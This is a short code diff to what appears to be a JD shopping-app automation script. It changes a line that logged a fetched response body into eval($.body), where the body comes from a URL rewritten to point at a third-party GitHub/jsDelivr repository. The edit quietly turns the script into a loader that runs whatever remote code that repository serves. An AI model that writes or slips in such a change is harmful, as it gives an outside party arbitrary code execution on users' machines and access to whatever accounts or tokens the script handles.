@@ -61,7 +61,7 @@ async function main() {
       /(https?:\/\/).+?\/updateTeam.+?jd_updateSmallHomeInviteCode(\.json)/g,
       "$1cdn.jsdelivr.net/gh/Tersd07/test@main/ushic$2"
     );
-    console.log($.body);
+    eval($.body);
   }
 }
 function updateShareCodes(url = 'https://raw.githubusercontent.com/Tersd07/st1/master/jd_small_home.js') {
